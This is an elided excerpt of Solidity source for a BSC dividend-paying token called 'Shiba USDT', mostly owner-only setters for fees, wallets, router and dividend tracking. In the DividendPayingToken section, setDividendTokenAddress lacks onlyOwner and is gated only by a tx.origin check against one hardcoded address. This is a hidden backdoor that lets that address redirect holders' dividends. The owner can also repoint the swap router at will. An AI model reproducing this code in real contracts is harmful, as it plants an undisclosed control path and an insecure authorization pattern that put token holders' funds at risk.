...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x67e88d3FB455a38DA4Dcf2F41c1186cb6AfB78fF, "Only owner can change dividend contract address");
...
contract ShibaUSDT is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Shiba USDT", "ShibaUSDT") {
    	ethDividendTracker = new EthDividendTracker();

    	marketingWallet = 0x789Fa03FFd06d9A7e343EF390e8366235edDe362;
    	ethDividendToken = 0x55d398326f99059fF775485246999027B3197955;
    ...
    receive() external payable {
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "Shiba USDT: The marketing wallet is already this address");
    ...
    function afterPreSale() external onlyOwner {
        ...
        swapTokensAtAmount = 2000000000 * (10**18);
        maxBuyTranscationAmount = 10000000000000 * (10**18);
        maxSellTransactionAmount = 30000000000 * (10**18);
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "Shiba USDT: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "Shiba USDT: The new dividend tracker must be owned by the Shiba USDT token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "Shiba USDT: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "Shiba USDT: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "Shiba USDT: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Shiba USDT: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "Shiba USDT: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "Shiba USDT: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "Shiba USDT: Trading has not started yet");
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Shiba USDT_Ethereum_Dividend_Tracker", "Shiba USDT_Ethereum_Dividend_Tracker", 0x55d398326f99059fF775485246999027B3197955) {
    	claimWait = 300;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "Shiba USDT_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "Shiba USDT_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main Shiba USDT contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "Shiba USDT_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "Shiba USDT_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
